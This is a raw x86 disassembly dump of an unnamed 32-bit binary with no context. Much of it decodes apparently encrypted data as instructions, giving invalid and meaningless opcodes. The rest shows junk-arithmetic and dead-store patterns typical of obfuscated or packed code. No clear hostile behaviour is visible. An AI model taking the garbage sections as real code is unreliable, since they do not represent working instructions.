  4156f3:	push   edi
  4156f4:	sub    al,0xde
  4156f6:	adc    BYTE PTR [eax-0x1a14756d],cl
  4156fc:	adc    edi,DWORD PTR [edx-0x2263135a]
  415702:	xor    DWORD PTR [eax+0x70],edi
  415705:	mov    ch,0x59
  415707:	adc    eax,0x5ceb6c48
  41570c:	add    edi,DWORD PTR [esi-0xf]
  41570f:	mov    al,ds:0x1297670b
  415714:	and    DWORD PTR [edi+0x51],eax
  415717:	ins    BYTE PTR es:[edi],dx
  415718:	hlt    
  415719:	mov    al,0x7d
  41571b:	idiv   DWORD PTR [ecx+0x70]
  41571e:	adc    BYTE PTR ds:0x9ed09bfd,bh
  415724:	mov    edi,?
  415726:	cmp    DWORD PTR [ebx-0x4b9f1271],ebp
  41572c:	lods   eax,DWORD PTR ds:[esi]
  41572d:	test   edi,ecx
  41572f:	mov    esi,0x91f4a3f7
  415734:	std    
  415735:	jecxz  0x4156f8
  415737:	shl    cl,cl
  415739:	mov    ds:0x9cf19be6,eax
  41573e:	xchg   edi,eax
  41573f:	xor    eax,DWORD PTR [esi+0x9107a62]
  415745:	lods   al,BYTE PTR ds:[esi]
  415746:	xor    BYTE PTR [esi+esi*1+0x6],al
  41574a:	in     al,dx
  41574b:	mov    ds:0xcbc5aba,eax
  415750:	ja     0x41573c
  415752:	inc    edi
  415753:	imul   esi,DWORD PTR [esi-0x1ff118f9],0xffffffc7
  41575a:	lahf   
  41575b:	jge    0x4156f2
  41575d:	scas   eax,DWORD PTR es:[edi]
  41575e:	sbb    DWORD PTR [ecx+0x70],edi
  415761:	cdq    
  415762:	in     al,dx
  415763:	imul   ebx,DWORD PTR [edx+ecx*4-0x36],0x1
  415768:	lock call 0x2056:0xef48d35d
  415770:	mov    BYTE PTR [ecx],al
  415772:	ret    0x879d
  415775:	lds    edx,FWORD PTR ds:0xb5fdcfcd
  41577b:	shr    BYTE PTR ss:[ebp+0x50],0x8
  415780:	stc    
  415781:	cld    
  415782:	js     0x41576f
  415784:	push   cs
  415785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415786:	or     al,0x6
  415788:	dec    eax
  415789:	sbb    eax,0x38eb8897
  41578e:	jle    0x415757
  415790:	xchg   edi,esp
  415792:	xchg   edx,esp
  415794:	mov    esp,0x86bf3575
  415799:	pop    esi
  41579a:	pop    ds
  41579b:	(bad)  
  41579c:	hlt    
  41579d:	aad    0xed
  41579f:	mov    ds:0x839227b1,al
  4157a4:	push   ecx
  4157a5:	les    esi,FWORD PTR [edx+0x5f]
  4157a8:	jb     0x41578b
  4157aa:	scas   al,BYTE PTR es:[edi]
  4157ab:	ins    BYTE PTR es:[edi],dx
  4157ac:	pop    ebp
  4157ad:	push   esp
  4157ae:	jmp    0x99dca56a
  4157b3:	mov    esp,DWORD PTR [ebx+0x48cf8e84]
  4157b9:	dec    esp
  4157ba:	adc    ch,BYTE PTR [eax]
  4157bc:	xor    DWORD PTR [ebx-0x51],ebx
  4157bf:	daa    
  4157c0:	cwde   
  4157c1:	iret   
  4157c2:	ss das 
  4157c4:	pop    eax
  4157c5:	push   esi
  4157c6:	lahf   
  4157c7:	mov    edi,0x9d2ca833
  4157cc:	ds jne 0x415849
  4157cf:	dec    ebx
  4157d0:	outs   dx,DWORD PTR ds:[esi]
  4157d1:	pop    eax
  4157d2:	mov    ecx,0xe5ce18fc
  4157d7:	pop    esi
  4157d8:	nop
  4157d9:	mov    edx,0x8e668cbb
  4157de:	push   ds
  4157df:	in     al,0xa4
  4157e1:	test   cl,al
  4157e3:	adc    BYTE PTR [esp+edi*4+0x49db621d],dl
  4157ea:	jb     0x4157e4
  4157ec:	in     al,0x93
  4157ee:	ss inc eax
  4157f0:	ds jl  0x415853
  4157f3:	add    ebp,DWORD PTR [ecx+0x5792cc5e]
  4157f9:	adc    eax,0xbedcf0d5
  4157fe:	mov    eax,ds:0xca0156e5
  415803:	shr    DWORD PTR ds:0x62566f16,cl
  415809:	pop    ebp
  41580a:	sub    DWORD PTR [edi],ecx
  41580c:	sbb    DWORD PTR [eax],esi
  41580e:	(bad)  
  41580f:	cdq    
  415810:	dec    edx
  415811:	sahf   
  415812:	pop    eax
  415813:	mov    eax,0x65ecfd33
  415818:	call   0xb8fc:0x77bb80a5
  41581f:	adc    BYTE PTR [ebp+0x4c],0xe4
  415823:	pop    edi
  415824:	stos   DWORD PTR es:[edi],eax
  415825:	clc    
  415826:	inc    edi
  415827:	out    dx,al
  415828:	outs   dx,DWORD PTR ds:[esi]
  415829:	xor    DWORD PTR [edx],eax
  41582b:	mov    bh,0xea
  41582d:	sub    al,bl
  41582f:	adc    esi,ecx
  415831:	and    al,BYTE PTR [ebp-0x6419cfda]
  415837:	icebp  
  415838:	gs pop edi
  41583a:	test   eax,0x998be536
  41583f:	sub    bh,BYTE PTR [esi+ebx*2+0x66]
  415843:	fcomp  DWORD PTR [ebx-0x13]
  415846:	xor    DWORD PTR [ebx],eax
  415848:	cwde   
  415849:	je     0x41585f
  41584b:	sbb    eax,0xb75b0f36
  415850:	adc    BYTE PTR [edi-0x28b751e5],0x32
  415857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415858:	push   cs
  415859:	fcomi  st,st(5)
  41585b:	cli    
  41585c:	rol    DWORD PTR [edi+0x5e],1
  41585f:	or     al,0xfa
  415861:	aam    0xb2
  415863:	mov    ah,0x56
  415865:	cs dec esp
  415867:	sub    DWORD PTR [edx-0x34c10824],ecx
  41586d:	cld    
  41586e:	mov    bl,0x42
  415870:	jnp    0x4158e1
  415872:	adc    esi,DWORD PTR [edi+0x69]
  415875:	sub    DWORD PTR [edx+0x2203358b],esi
  41587b:	pusha  
  41587c:	jne    0x41586b
  41587e:	loopne 0x4158f7
  415880:	or     esp,DWORD PTR [ecx+0x76]
  415883:	nop
  415884:	jp     0x41580e
  415886:	frstor [edx+0x2767e441]
  41588c:	out    0xa5,al
  41588e:	in     eax,0x2e
  415890:	or     eax,DWORD PTR [esi]
  415892:	(bad)  
  415893:	nop
  415894:	mov    al,0xe7
  415896:	jo     0x415887
  415898:	ds mov edi,0x4eb3e032
  41589e:	xor    dl,dl
  4158a0:	cwde   
  4158a1:	lods   eax,DWORD PTR ds:[esi]
  4158a2:	push   edx
  4158a3:	or     DWORD PTR [esi],edx
  4158a5:	xchg   esp,eax
  4158a6:	or     BYTE PTR [esi+0x4b],cl
  4158a9:	or     eax,edx
  4158ab:	push   0x1
  4158ad:	add    eax,edi
  4158af:	push   eax
  4158b0:	lea    eax,[ebp-0x13]
  4158b3:	push   eax
  4158b4:	shl    ecx,0x1e
  4158b7:	call   0x411c08
  4158bc:	mov    eax,DWORD PTR [ebp+0x10]
  4158bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4158c2:	shrd   eax,ecx,0x2
  4158c6:	shr    ecx,0x2
  4158c9:	mov    ecx,DWORD PTR [ebp+0x10]
  4158cc:	mov    edx,DWORD PTR [ebp+0x14]
  4158cf:	xor    eax,esi
  4158d1:	xor    edx,edx
  4158d3:	or     eax,edx
  4158d5:	add    eax,edi
  4158d7:	push   0x1
  4158d9:	push   eax
  4158da:	mov    eax,DWORD PTR [ebp+0x8]
  4158dd:	shl    ecx,0x1e
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	shrd   eax,ecx,0x2
  4158e7:	shr    ecx,0x2
  4158ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4158ed:	mov    edx,DWORD PTR [ebp+0xc]
  4158f0:	xor    eax,esi
  4158f2:	xor    edx,edx
  4158f4:	or     eax,edx
  4158f6:	add    eax,edi
  4158f8:	push   eax
  4158f9:	shl    ecx,0x1e
  4158fc:	call   0x411c08
  415901:	push   0x1
  415903:	lea    eax,[ebp-0x13]
  415906:	push   eax
  415907:	mov    eax,DWORD PTR [ebp+0x10]
  41590a:	mov    ecx,DWORD PTR [ebp+0x14]
  41590d:	shrd   eax,ecx,0x2
  415911:	shr    ecx,0x2
  415914:	mov    ecx,DWORD PTR [ebp+0x10]
  415917:	mov    edx,DWORD PTR [ebp+0x14]
  41591a:	xor    eax,esi
  41591c:	xor    edx,edx
  41591e:	or     eax,edx
  415920:	add    eax,edi
  415922:	push   eax
  415923:	shl    ecx,0x1e
  415926:	call   0x411c08
  41592b:	mov    eax,DWORD PTR [ebp+0x10]
  41592e:	mov    ecx,DWORD PTR [ebp+0x14]
  415931:	shrd   eax,ecx,0x2
  415935:	shr    ecx,0x2
  415938:	mov    ecx,DWORD PTR [ebp+0x10]
  41593b:	mov    edx,DWORD PTR [ebp+0x14]
  41593e:	pop    edi
  41593f:	xor    eax,esi
  415941:	xor    edx,edx
  415943:	pop    esi
  415944:	shl    ecx,0x1e
  415947:	or     eax,edx
  415949:	pop    ebx
  41594a:	leave  
  41594b:	ret    0x10
  41594e:	mov    eax,DWORD PTR [esp+0x8]
  415952:	or     DWORD PTR ds:0x4284c5,0x7249
  41595c:	mov    ecx,DWORD PTR [esp+0x10]
  415960:	or     ecx,eax
  415962:	mov    DWORD PTR ds:0x428561,0x6956
  41596c:	mov    ecx,DWORD PTR [esp+0xc]
  415970:	jne    0x4159ee
  415976:	cmp    DWORD PTR ds:0x428435,0x0
  41597d:	mov    DWORD PTR ds:0x428555,0x1bde
  415987:	mov    DWORD PTR ds:0x428479,0x1ea7
  415991:	jmp    0x4159e5
  415996:	mov    eax,0x417c
  41599b:	mov    DWORD PTR ds:0x428581,ebx
  4159a1:	cmp    DWORD PTR ds:0x428435,0x0
  4159a8:	jne    0x4159d1
  4159ae:	push   DWORD PTR [ebp-0x28]
  4159b1:	call   DWORD PTR ds:0x42e0e0
  4159b7:	adc    DWORD PTR ds:0x4284c5,0x428409
  4159c1:	sub    DWORD PTR ds:0x42843d,0x4284f9
  4159cb:	and    DWORD PTR ds:0x428455,edi
  4159d1:	mov    DWORD PTR ds:0x42846d,0x6bfe
  4159db:	adc    DWORD PTR ds:0x4284dd,0x437a
  4159e5:	mov    eax,DWORD PTR [esp+0x4]
  4159e9:	mul    ecx
  4159eb:	ret    0x10
  4159ee:	push   ebx
  4159ef:	mul    ecx
  4159f1:	mov    ebx,eax
  4159f3:	mov    eax,DWORD PTR [esp+0x8]
  4159f7:	mul    DWORD PTR [esp+0x14]
  4159fb:	add    ebx,eax
  4159fd:	mov    eax,DWORD PTR [esp+0x8]
  415a01:	mul    ecx
  415a03:	add    edx,ebx
  415a05:	pop    ebx
  415a06:	ret    0x10
  415a09:	push   ebp
  415a0a:	mov    ebp,esp
  415a0c:	sub    esp,0x44
  415a0f:	push   ebx
  415a10:	push   esi
  415a11:	push   edi
  415a12:	mov    DWORD PTR [ebp-0x18],0x2
  415a19:	mov    DWORD PTR [ebp-0x14],0x29f0
  415a20:	mov    DWORD PTR [ebp-0x10],0x3716
  415a27:	mov    DWORD PTR [ebp-0x2c],0x4e09
  415a2e:	mov    DWORD PTR [ebp-0x28],0x4497
  415a35:	mov    DWORD PTR [ebp-0x24],0x5
  415a3c:	mov    DWORD PTR [ebp-0x20],0x2a0a
  415a43:	mov    DWORD PTR [ebp-0x1c],0x1
  415a4a:	mov    DWORD PTR [ebp-0xc],0xce6
  415a51:	mov    DWORD PTR [ebp-0x8],0x12b3
  415a58:	mov    DWORD PTR [ebp-0x4],0xb09
  415a5f:	mov    DWORD PTR [ebp-0x44],0x7617
  415a66:	mov    DWORD PTR [ebp-0x40],0x721a
  415a6d:	mov    DWORD PTR [ebp-0x3c],0x5151
  415a74:	mov    DWORD PTR [ebp-0x38],0x14aa
  415a7b:	mov    DWORD PTR [ebp-0x34],0x5a28
  415a82:	mov    DWORD PTR [ebp-0x30],0x19a8
  415a89:	mov    ecx,DWORD PTR [ebp-0x1c]
  415a8c:	mov    eax,DWORD PTR [ebp-0x20]
  415a8f:	xor    edx,edx
  415a91:	div    ecx
  415a93:	mov    ecx,DWORD PTR [ebp-0x24]
  415a96:	xor    edx,edx
  415a98:	mov    esi,0x1ac5
  415a9d:	push   0x20
  415a9f:	div    ecx
  415aa1:	mov    ecx,DWORD PTR [ebp-0x28]
  415aa4:	xor    edx,edx
  415aa6:	xor    eax,0x60dc
  415aab:	sub    eax,ecx
  415aad:	mov    ecx,DWORD PTR [ebp-0x2c]
  415ab0:	lea    edi,[eax+ecx*1-0x6300]
  415ab7:	mov    eax,DWORD PTR [ebp-0x4]
  415aba:	mov    ecx,DWORD PTR [ebp-0x8]
  415abd:	sub    eax,0x7721
  415ac2:	xor    eax,ecx
  415ac4:	mov    ecx,DWORD PTR [ebp-0xc]
  415ac7:	xor    eax,ecx
  415ac9:	or     eax,0x7bc9
  415ace:	xor    eax,0xfffff0db
  415ad3:	mov    ebx,edi
  415ad5:	sub    ebx,eax
  415ad7:	mov    eax,DWORD PTR [ebp-0x10]
  415ada:	mov    ecx,DWORD PTR [ebp-0x14]
  415add:	xor    eax,ecx
  415adf:	mov    ecx,DWORD PTR [ebp-0x18]
  415ae2:	sub    eax,esi
  415ae4:	div    ecx
  415ae6:	mov    ecx,0x211
  415aeb:	pop    edx
  415aec:	xor    eax,ecx
  415aee:	jmp    0x415ef7
  415af3:	push   ds
  415af4:	inc    ecx
  415af5:	cmp    edi,esi
  415af7:	mov    edx,0x9f9c24b7
  415afc:	push   ecx
  415afd:	mov    ebp,0xe12d1ccf
  415b02:	nop
  415b03:	pushf  
  415b04:	mov    esp,0xc48ebebe
  415b09:	mov    esi,0x59b7e0be
  415b0e:	les    edi,FWORD PTR [ebp-0x42cf87b3]
  415b14:	inc    ebx
  415b15:	inc    ecx
  415b16:	cdq    
  415b17:	ret    
  415b18:	and    DWORD PTR ds:0x55ba88e5,edi
  415b1e:	pushf  
  415b1f:	arpl   WORD PTR [esi],dx
  415b21:	jb     0x415acf
  415b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b24:	inc    ebx
  415b25:	inc    ebx
  415b26:	pop    edi
  415b27:	or     BYTE PTR [ebx-0x17],dh
  415b2a:	fwait
  415b2b:	scas   al,BYTE PTR es:[edi]
  415b2c:	leave  
  415b2d:	inc    edx
  415b2e:	add    al,0xb5
  415b30:	loop   0x415ac0
  415b32:	pop    ecx
  415b33:	jb     0x415bad
  415b35:	jle    0x415b3b
  415b37:	pop    ecx
  415b38:	add    DWORD PTR [ebx+0x30],0x11e3a2cd
  415b3f:	mov    eax,0x8131c15c
  415b44:	ds pop ss
  415b46:	outs   dx,DWORD PTR ds:[esi]
  415b47:	push   fs
  415b49:	test   DWORD PTR [eiz*2+0x5c9005c7],esi
  415b50:	fsubr  DWORD PTR [ecx]
  415b52:	(bad)  
  415b53:	in     eax,dx
  415b54:	push   es
  415b55:	out    dx,al
  415b56:	mov    eax,DWORD PTR [ebp-0x1f]
  415b59:	push   ebp
  415b5a:	jmp    0x415adc
  415b5c:	in     eax,dx
  415b5d:	aam    0x5b
  415b5f:	outs   dx,DWORD PTR ds:[esi]
  415b60:	pop    ebp
  415b61:	imul   BYTE PTR [ebx]
  415b63:	stos   BYTE PTR es:[edi],al
  415b64:	hlt    
  415b65:	mov    edx,DWORD PTR [edi-0x2f]
  415b68:	das    
  415b69:	std    
  415b6a:	clc    
  415b6b:	xor    bh,bl
  415b6d:	adc    DWORD PTR [ebx],0xf2ec20de
  415b73:	mov    al,ds:0xd0017c64
  415b78:	js     0x415b52
  415b7a:	xor    DWORD PTR [eax-0x1c],esi
  415b7d:	cmc    
  415b7e:	popa   
  415b7f:	push   edx
  415b80:	and    eax,0xaeecfdd9
  415b85:	in     eax,dx
  415b86:	dec    ebx
  415b87:	jmp    0x1e0b46fc
  415b8c:	das    
  415b8d:	inc    esp
  415b8e:	(bad)  [ebx]
  415b90:	in     eax,0x60
  415b92:	adc    al,0x22
  415b94:	push   ss
  415b95:	jge    0x415b18
  415b97:	jecxz  0x415b3b
  415b99:	jne    0x415be4
  415b9b:	neg    BYTE PTR [edx]
  415b9d:	idiv   edi
  415b9f:	and    cl,bh
  415ba1:	lea    ebx,[edi+0x3d]
  415ba4:	clc    
  415ba5:	fmul   st(0),st
  415ba7:	dec    ebp
  415ba8:	add    BYTE PTR [esi-0x6f7cdeb1],cl
  415bae:	and    ecx,DWORD PTR [ebx+0x6d]
  415bb1:	fs mov ch,0xd1
  415bb4:	xchg   edi,eax
  415bb5:	pop    esp
  415bb6:	loop   0x415bc1
  415bb8:	addr16 inc eax
  415bba:	mov    edx,0xeff64390
  415bbf:	jbe    0x415bd4
  415bc1:	push   edx
  415bc2:	not    BYTE PTR [ebx+0xfcf8dd7]
  415bc8:	outs   dx,DWORD PTR ds:[esi]
  415bc9:	xor    BYTE PTR [ecx+0x4e2088d8],ah
  415bcf:	cmp    DWORD PTR [edi+0x52d043a7],esi
  415bd5:	adc    eax,0xa9bf8566
  415bda:	mov    ds:0xddf69b1e,al
  415bdf:	ret    0x1e09
  415be2:	pop    esi
  415be3:	inc    ebx
  415be4:	pop    ds
  415be5:	sub    BYTE PTR [edi+0x18],dl
  415be8:	(bad)  
  415be9:	mov    edx,0x8e040312
  415bee:	(bad)  [eax+edi*8+0x23]
  415bf2:	(bad)  
  415bf3:	repz (bad) 
  415bf5:	rol    DWORD PTR [ebp-0x73],1
  415bf8:	mov    ch,0xef
  415bfa:	mov    BYTE PTR [ebx],dl
  415bfc:	sbb    DWORD PTR [edi+0x6],ebp
  415bff:	or     esp,ebp
  415c01:	imul   eax,DWORD PTR [ebx+0x5f],0xffffffd5
  415c05:	mov    gs,ebx
  415c07:	cld    
  415c08:	test   BYTE PTR [ebp-0x42],dl
  415c0b:	or     esi,ebx
  415c0d:	jmp    0x415bcf
  415c0f:	jecxz  0x415bf4
  415c11:	push   es
  415c12:	sub    al,BYTE PTR [ebp+0x50]
  415c15:	stos   DWORD PTR es:[edi],eax
  415c16:	xchg   BYTE PTR [eax+ebp*4+0x5a47c28a],bl
  415c1d:	into   
  415c1e:	push   edx
  415c1f:	pop    esi
  415c20:	and    eax,0x55b4a81f
  415c25:	jo     0x415c42
  415c27:	(bad)  
  415c28:	and    DWORD PTR [esi+0x488bf938],eax
  415c2e:	pop    eax
  415c2f:	jmp    0x30ff9034
  415c34:	(bad)  
  415c35:	fsubr  DWORD PTR [ebx-0x142ab404]
  415c3b:	popa   
  415c3c:	adc    ebx,DWORD PTR [eax+0x56]
  415c3f:	or     dh,BYTE PTR [ecx-0x4f]
  415c42:	sub    eax,0xc567148c
  415c47:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415c49:	adc    BYTE PTR [ecx],bh
  415c4b:	push   ebx
  415c4c:	fldl2e 
  415c4e:	loopne 0x415cac
  415c50:	inc    edi
  415c51:	push   esi
  415c52:	pop    edi
  415c53:	imul   DWORD PTR [ebp-0x61f5e0cd]
  415c59:	cmp    dh,BYTE PTR [eax+0x18d6f1d5]
  415c5f:	inc    ebp
  415c60:	or     DWORD PTR [ebx+0x7],ebp
  415c63:	bound  eax,QWORD PTR [edi+0x5bb02877]
  415c69:	sub    BYTE PTR [edi],ch
  415c6b:	pop    eax
  415c6c:	dec    edi
  415c6d:	mov    ebx,0x66f6ea44
  415c72:	push   es
  415c73:	pop    ss
  415c74:	adc    eax,0xb619b425
  415c79:	mov    al,ds:0x8adb56f1
  415c7e:	and    ecx,eax
  415c80:	lods   eax,DWORD PTR ds:[esi]
  415c81:	inc    eax
  415c82:	fcomp  DWORD PTR [edi-0x501fe603]
  415c88:	dec    eax
  415c89:	aam    0xa8
  415c8b:	clc    
  415c8c:	jg     0x415cb5
  415c8e:	fadd   st(4),st
  415c90:	mov    dh,0x73
  415c92:	data16 (bad) 
  415c94:	ror    BYTE PTR [eax+0x3857c695],cl
  415c9a:	nop
  415c9b:	lahf   
  415c9c:	es adc dh,ch
  415c9f:	jns    0x415c84
  415ca1:	mov    ebp,0x35c02f73
  415ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca7:	(bad)  
  415ca9:	or     al,0x6f
  415cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cac:	adc    ch,al
  415cae:	inc    ebp
  415caf:	push   es
  415cb0:	jnp    0x415c6d
  415cb2:	mov    cl,0x16
  415cb4:	mov    ebp,0x478d45f1
  415cb9:	popa   
  415cba:	mov    bl,0xdd
  415cbc:	cmp    dl,bh
  415cbe:	das    
  415cbf:	icebp  
  415cc0:	xchg   esp,eax
  415cc1:	sbb    eax,0xcc4dc811
  415cc6:	push   esi
  415cc7:	mov    bl,0x59
  415cc9:	mov    edx,0xc9c65ccb
  415cce:	into   
  415ccf:	push   0x72f026bf
  415cd4:	out    dx,al
  415cd5:	pop    ebp
  415cd6:	adc    al,ch
  415cd8:	adc    ah,dl
  415cda:	std    
  415cdb:	pop    ss
  415cdc:	call   0xa44d:0x15b8eef1
  415ce3:	ret    0xfd12
  415ce6:	adc    BYTE PTR [ecx+0x24242130],al
  415cec:	push   ds
  415ced:	mov    BYTE PTR [edi],cl
  415cef:	add    eax,0x191d913d
  415cf4:	xchg   BYTE PTR ds:0x7f419023,dh
  415cfa:	xlat   BYTE PTR ds:[ebx]
  415cfb:	inc    ecx
  415cfc:	or     eax,0xe0e1ff28
  415d01:	aam    0x64
  415d03:	and    edi,DWORD PTR [esi-0xe]
  415d06:	mov    bh,0x50
  415d08:	mov    dl,0x81
  415d0a:	mov    cl,0xd3
  415d0c:	sahf   
  415d0d:	pop    ebx
  415d0e:	pusha  
  415d0f:	push   ebp
  415d10:	fist   DWORD PTR [eax-0xc]
  415d13:	loope  0x415ccd
  415d15:	out    dx,al
  415d16:	fnstsw WORD PTR [ecx-0x3fb91040]
  415d1c:	xchg   esi,eax
  415d1d:	pop    esi
  415d1e:	xor    edx,ebp
  415d20:	aas    
  415d21:	adc    BYTE PTR [ebp-0x4],bl
  415d24:	sbb    DWORD PTR [ebp-0x76],edx
  415d27:	int    0xd8
  415d29:	cdq    
  415d2a:	mov    bl,0x9d
  415d2c:	int3   
  415d2d:	dec    ebx
  415d2e:	push   ebx
  415d2f:	jno    0x415d74
  415d31:	sbb    al,0x33
  415d33:	fild   WORD PTR [esi]
  415d35:	sar    DWORD PTR [edx+0x21],1
  415d38:	adc    DWORD PTR [esi-0x37],eax
  415d3b:	popf   
  415d3c:	addr16 das 
  415d3e:	sbb    BYTE PTR [eax+0x22],dl
  415d41:	hlt    
  415d42:	sub    DWORD PTR [ecx+eiz*8-0x46],esp
  415d46:	inc    ebp
  415d47:	jno    0x415d66
  415d49:	jne    0x415d54
  415d4b:	out    0xa0,eax
  415d4d:	clc    
  415d4e:	les    esi,FWORD PTR [ecx-0x67]
  415d51:	jne    0x415d81
  415d53:	(bad)  
  415d55:	jmp    0xf022f921
  415d5a:	cmp    DWORD PTR [ebx],eax
  415d5c:	lea    ecx,[esi+0x14]
  415d5f:	mov    eax,ds:0x442eeed8
  415d64:	into   
  415d65:	jmp    0x3db110bd
  415d6a:	retf   0x660f
  415d6d:	add    BYTE PTR [ecx-0x33a86591],ah
  415d73:	sbb    eax,DWORD PTR [edi+0x50]
  415d76:	(bad)  
  415d77:	mov    edx,0x8a58a3b
  415d7c:	dec    esp
  415d7d:	jae    0x415db2
  415d7f:	inc    edx
  415d80:	sub    DWORD PTR [edi+0x7a],ebp
  415d83:	and    edi,DWORD PTR [ecx+0x6]
  415d86:	(bad)  
  415d87:	mov    ds:0xe90e4058,al
  415d8c:	icebp  
  415d8d:	pop    eax
  415d8e:	les    ecx,FWORD PTR [eax]
  415d90:	test   al,0x38
  415d92:	push   esp
  415d93:	std    
  415d94:	stc    
  415d95:	push   0xffffff92
  415d97:	sahf   
  415d98:	dec    edi
  415d99:	aad    0x39
  415d9b:	sti    
  415d9c:	addr16 jmp 0x415e06
  415d9f:	jne    0x415dbf
  415da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415da2:	pushf  
  415da3:	int    0xf8
  415da5:	and    cl,BYTE PTR [eax-0x38]
  415da8:	sbb    al,0x56
  415daa:	repnz (bad)
  415dad:	(bad)  
  415db0:	push   edi
  415db1:	shl    esi,1
  415db3:	(bad)
  415db7:	mov    ebx,0xf558e872
  415dbc:	mov    edx,0x5b0c0b0d
  415dc1:	(bad)  
  415dc2:	jb     0x415d86
  415dc4:	arpl   WORD PTR [edi+0x77],ax
  415dc7:	(bad)  [esp+ebx*4-0x4261b29e]
  415dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dcf:	sahf   
  415dd0:	jge    0x415dc5
  415dd2:	shl    bl,1
  415dd4:	add    ch,al
  415dd6:	test   al,0x10
  415dd8:	lds    esp,FWORD PTR [esi]
  415dda:	fstp   QWORD PTR [edi-0x48]
  415ddd:	cwde   
  415dde:	out    dx,al
  415ddf:	ja     0x415dc8
  415de1:	popf   
  415de2:	icebp  
  415de3:	sub    eax,0xdde0916d
  415de8:	jns    0x415d73
  415dea:	(bad)  
  415dec:	pop    edi
  415ded:	sbb    DWORD PTR [edi-0x29],eax
  415df0:	or     DWORD PTR [ebx+0x336a827c],ebx
  415df6:	or     ecx,esi
  415df8:	xchg   DWORD PTR [ecx],esi
  415dfa:	and    BYTE PTR [edi],bl
  415dfc:	sbb    DWORD PTR [esi],esi
  415dfe:	add    eax,0x6ab8eb8
  415e03:	outs   dx,DWORD PTR ds:[esi]
  415e04:	mov    eax,ds:0xff200ac
  415e09:	cld    
  415e0a:	dec    ebx
  415e0b:	jne    0x415e32
  415e0d:	out    0x71,al
  415e0f:	push   0xffffff92
  415e11:	repnz sbb BYTE PTR [edx],bl
  415e14:	(bad)  
  415e15:	js     0x415e2e
  415e17:	inc    edx
  415e18:	add    al,0x7a
  415e1a:	sbb    DWORD PTR [ecx-0x2c],ebx
  415e1d:	xchg   esp,eax
  415e1e:	sub    BYTE PTR [ebp-0x56],ch
  415e21:	mov    ecx,DWORD PTR [ecx+0x5d4f937b]
  415e27:	ins    DWORD PTR es:[edi],dx
  415e28:	pushf  
  415e29:	pop    edx
  415e2a:	pop    eax
  415e2b:	or     eax,0xa998ae2d
  415e30:	xchg   ebx,eax
  415e31:	pop    ebp
  415e32:	fs addr16 pusha 
  415e35:	push   ss
  415e36:	sbb    BYTE PTR [ebx+0x6a51daf0],0x85
  415e3d:	adc    al,0x9f
  415e3f:	out    0xd8,eax
  415e41:	jae    0x415e04
  415e43:	xchg   ebp,eax
  415e44:	push   esi
  415e45:	push   ecx
  415e46:	(bad)  
  415e48:	dec    edx
  415e49:	shr    DWORD PTR [ebp+0x3e],cl
  415e4c:	inc    BYTE PTR [esi-0x215fba9a]
  415e52:	xchg   edx,eax
  415e53:	jg     0x415e44
  415e55:	xchg   DWORD PTR [ebx+0x4619e74e],edx
  415e5b:	ror    edi,0x9
  415e5e:	bound  ebx,QWORD PTR [ebp+0x79981368]
  415e64:	adc    dh,bh
  415e66:	in     al,0xd1
  415e68:	bound  edx,QWORD PTR [eax-0x65]
  415e6b:	or     bl,0xef
  415e6e:	jno    0x415ec9
  415e70:	retf   0x18d9
  415e73:	daa    
  415e74:	sub    ecx,DWORD PTR [eax+esi*4]
  415e77:	push   ss
  415e78:	adc    bl,ah
  415e7a:	lods   eax,DWORD PTR ds:[esi]
  415e7b:	int    0x41
  415e7d:	(bad)  
  415e7e:	je     0x415eff
  415e80:	push   es
  415e81:	jmp    0x415ef5
  415e83:	clc    
  415e84:	mov    BYTE PTR [esi-0x27],cl
  415e87:	std    
  415e88:	out    dx,eax
  415e89:	jae    0x415ed0
  415e8b:	pop    esi
  415e8c:	xlat   BYTE PTR ds:[ebx]
  415e8d:	loope  0x415e84
  415e8f:	jbe    0x415e3e
  415e91:	lods   eax,DWORD PTR ds:[esi]
  415e92:	arpl   WORD PTR [ebx+0x6e],sp
  415e95:	jbe    0x415e7e
  415e97:	(bad)  
  415e98:	xor    al,bh
  415e9a:	pop    ebx
  415e9b:	add    DWORD PTR [ecx],eax
  415e9d:	hlt    
  415e9e:	fwait
  415e9f:	cwde   
  415ea0:	or     eax,0x7abc89a3
  415ea5:	rcl    BYTE PTR ds:0x78b30b48,0xd4
  415eac:	loopne 0x415ef8
  415eae:	aad    0x4
  415eb0:	lods   al,BYTE PTR ds:[esi]
  415eb1:	adc    bh,ch
  415eb3:	pop    ss
  415eb4:	push   ecx
  415eb5:	ss call 0xa1d30b38
  415ebb:	stos   BYTE PTR es:[edi],al
  415ebc:	(bad)  
  415ebd:	fstp   TBYTE PTR [ebx+0x6e463b25]
  415ec3:	xor    al,0xb4
  415ec5:	js     0x415f3b
  415ec7:	pop    edx
  415ec8:	fwait
  415ec9:	pop    ds
  415eca:	pop    esi
  415ecb:	(bad)  
  415ecc:	aam    0x8c
  415ece:	push   ebp
  415ecf:	or     DWORD PTR [ebp-0x1d0c293a],esp
  415ed5:	in     eax,dx
  415ed6:	ret    
  415ed7:	cmp    bl,bl
  415ed9:	enter  0x8602,0x1
  415edd:	call   0xcdf8:0x45890ae1
  415ee4:	ror    BYTE PTR [edi-0x24239833],1
  415eea:	sub    al,0xc4
  415eec:	inc    esi
  415eed:	ret    0x6e51
  415ef0:	sar    ecx,cl
  415ef2:	adc    al,BYTE PTR ds:0x2b307c32
  415ef8:	sar    BYTE PTR [ebx],1
  415efa:	fimul  DWORD PTR [edi]
  415efc:	xchg   esi,edx
  415efe:	or     BYTE PTR [eax],al
  415f00:	add    cl,ch
  415f02:	add    eax,DWORD PTR [eax]
  415f04:	add    BYTE PTR [eax],al
  415f06:	mov    edi,DWORD PTR [ebp-0x2c]
  415f09:	mov    DWORD PTR [ebp-0x20],0x1aa3
  415f10:	mov    DWORD PTR [ebp-0x24],0x52d
  415f17:	mov    DWORD PTR [ebp-0x28],0x226c
  415f1e:	jmp    0x416327
  415f23:	dec    eax
  415f24:	pop    edi
